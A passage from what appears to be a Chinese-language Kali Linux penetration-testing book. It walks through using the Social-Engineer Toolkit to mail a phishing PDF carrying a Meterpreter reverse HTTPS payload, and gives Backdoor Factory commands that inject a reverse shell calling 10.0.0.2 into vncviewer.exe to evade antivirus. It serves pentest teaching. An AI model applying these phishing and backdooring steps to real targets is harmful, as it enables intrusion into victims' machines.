1.  9) Adobe Collab.collectEmailInfo 缓冲区溢出

1.  10) Adobe Collab.getIcon 缓冲区溢出

1.  11) Adobe JBIG2Decode 内存损坏利用

1.  12) Adobe PDF 嵌入式 EXE 社会工程

1.  13) Adobe util.printf()缓冲区溢出

1.  14) 自定义 EXE 到 VBA（通过 RAR 发送）（需要 RAR）

1.  15) Adobe U3D CLODProgressiveMeshDeclaration 数组超限

1.  16) Adobe PDF 嵌入式 EXE 社会工程（NOJS）

1.  17) Foxit PDF Reader v4.1.1 标题堆栈缓冲区溢出

1.  18) Apple QuickTime PICT PnSize 缓冲区溢出

1.  19) Nuance PDF Reader v6.0 启动堆栈缓冲区溢出

1.  20) Adobe Reader u3D 内存损坏漏洞

1.  21) MSCOMCTL ActiveX 缓冲区溢出（ms12-027）

![](img/dd7b9407-5bf6-410d-8623-38eaf4fbd7b7.png)

让我们只选择默认的项目 12。当您按*Enter*时，下一个屏幕让您选择自己选择的经过处理的 PDF 文件，或者使用内置的空白 PDF。选择第二个选项，我们看到七个选项：

1.  1) Windows 反向 TCP Shell

1.  2) Windows Meterpreter Reverse_TCP

1.  3) Windows 反向 VNC DLL

1.  4) Windows 反向 TCP Shell（x64）

1.  5) Windows Meterpreter Reverse_TCP（X64）

1.  6) Windows Shell Bind_TCP (X64)

1.  7) Windows Meterpreter Reverse HTTPS

![](img/6ce59fb0-5deb-462b-a6a3-4f605a32b927.png)

由于其中三个选项将运行代码，使受害者机器联系到您的 Metasploit Framework Meterpreter 工具，而且您已经在使用该工具进行练习，选择其中一个作为您的恶意有效负载可能是有意义的。让我们选择选项`7) Windows Meterpreter Reverse HTTPS`。

当我们输入`7`时，会得到几个选项：

+   监听器的 IP 地址（LHOST）：使用您将拥有监听器的主机地址。我的 Kali 工作站认为它是 10.0.2.15。

+   连接回[443]端口：端口`443`在这里是默认的，但您可以在监听设备上的任何端口上设置监听器。`443`是 HTTPS 端口，因此由于其编号，它看起来不会不寻常。端口`12234`看起来不寻常，如果防火墙管理员正在将批准的端口列入白名单，并将其他所有端口列入黑名单，则可能也会被阻止。它说明有效负载被发送到`/root/.set/template.pdf`目录。

这不是它的作用。在这种情况下，可执行文件被设置为`legit.exe`。当您输入文件名时，如下面的截图所示，您需要使用完整的路径：

![](img/5be5dade-6d9e-460a-8dfe-d068018856f0.png)

选择 PDF 的名称后，启动社会工程工具包大规模邮件发送程序。

如果您找到了一个开放的邮件中继，邮件发送程序将使用该中继，一个 Gmail 帐户或任何合法的电子邮件 SMTP 服务器。SET 不包含自己的 SMTP 服务器。您可能希望找到一个可以用于此目的的免费电子邮件服务，或者使用一个开放的中继邮件服务器：

![](img/a860d416-3adb-4f5a-85b0-3715dd2b0fa6.png)

# 选择一个主题，或者编写一封新的电子邮件消息

SET 允许您为钓鱼电子邮件攻击选择几个不同的有吸引力的电子邮件主题，并且您可以轻松添加新模板以自定义方法。以下列表中的第四个选择是我们刚刚创建的选择：

![](img/ea8b6337-4dc8-4013-acec-c973d0042ed6.png)

为了测试系统，我选择将攻击发送到一个我控制的 Gmail 帐户。如果发送消息时出现错误，SET 不会返回到邮件发送程序部分。Google Mail 捕获了虚假的 PDF 文件，并发送了一个指向其安全页面的链接：

![](img/8ad7cd15-7d83-4f80-bab7-3c1070ecc993.png)

使用不检查感染附件的服务器的电子邮件帐户。我们使用了`evilhacker@act23.com`，并将电子邮件发送到`kalibook@act23.com`，这起作用了：

![](img/4c9f74d7-6cfe-431d-8be3-2b32c54f5793.png)

# 使用后门工厂来规避杀毒软件

这个利用代码在没有杀毒软件的 XP SP2 机器上运行良好，并且在任何没有安装 AV 的机器上都会运行良好，但在安装了基本默认 Windows 杀毒软件的 Windows 10 机器上效果较差。我们不得不关闭杀毒软件的实时检查功能，才能使电子邮件在没有错误的情况下读取，而杀毒软件则清除了我们的篡改文件。作为安全工程师，我们很高兴微软 Windows 10 拥有如此有效的反恶意软件功能。作为渗透测试人员，我们感到失望。

后门工厂将 shellcode 插入工作中的 EXE 文件，而不会对原始文件进行太多更改。您可以使用`/usr/share/windows-binaries`目录中的可执行文件，如下面的截图所示，或者任何其他没有内置保护的 Windows 二进制文件：

![](img/28f499f6-38d8-4c5d-a6b7-98ee4b56d76b.png)

运行 Backdoor Factory 并在`10.0.0.2`上的端口`43434`创建一个远程 shell 的代码如下。跳洞选项将您的代码传播到可执行文件中的空白，以进一步混淆杀毒软件扫描：

```
backdoor-factory -cave-jumping -f /usr/share/windows-binaries/vncviewer.exe -H 10.0.0.2 -P 43434 -s reverse_shell_tcp  
```

如果您在 shellcode 选择中出现错误，应用程序会显示您的选择：

![](img/c25fd43e-5741-4d32-bb29-1b3ffa7e30af.png)

```
backdoor-factory -cave-jumping -f /usr/share/windows-binaries/vncviewer.exe -H 10.0.0.2 -P 43434 -s reverse_shell_tcp_inline 
```

然后，后门工厂继续并提供选项，将 shellcode 注入二进制文件中的所有空白或洞：

![](img/a5df754f-1f57-41b9-a382-f03992a1216f.png)

我们将选择 Cave 1：

![](img/6d2fbe20-617e-428e-afeb-d6f2c5db0cf8.png)

`backdoored`目录位于根`home`目录`~/backdoored/`中，因此很容易找到。我们可以使用 SET 将这个篡改过的文件推送到大规模邮件中，但您可以只需从伪造的帐户发送电子邮件到 Windows 10 框，以查看它是否可以清除杀毒软件障碍。可执行文件必须被压缩以通过我们的邮件服务器上的过滤器，一旦它在 Windows 10 机器上解压缩，它就会被删除为恶意软件文件。

Windows 10 的默认杀毒软件发现了这个文件，就像它发现了 SET 中的其他文件一样。未打补丁的旧版本的 Windows 明显存在风险。

# 总结

在本章中，您已经看到了五种不同的方法来控制并在 Windows 机器上设置后门，从 Ncat 脚本编写，到 Metasploit Meterpreter 攻击，再到添加一个 Drop Box，再到使用 SET 发送钓鱼邮件，以及使用 Backdoor Factory 创建带有 shell 脚本后门的可执行文件。

在本章中，我们还学习了在各种设备上设置和使用跳板机。

在下一章中，我们将讨论反向工程恶意软件的收集，以便您了解它在野外或您的网络中可能会做什么，并对您的设备进行压力测试。

# 进一步阅读

+   **Kali 树莓派设置**：[`docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi`](https://docs.kali.org/kali-on-arm/install-kali-linux-arm-raspberry-pi)

+   **树莓派磁盘加密**：[`docs.kali.org/kali-dojo/04-raspberry-pi-with-luks-disk-encryption`](https://docs.kali.org/kali-dojo/04-raspberry-pi-with-luks-disk-encryption)
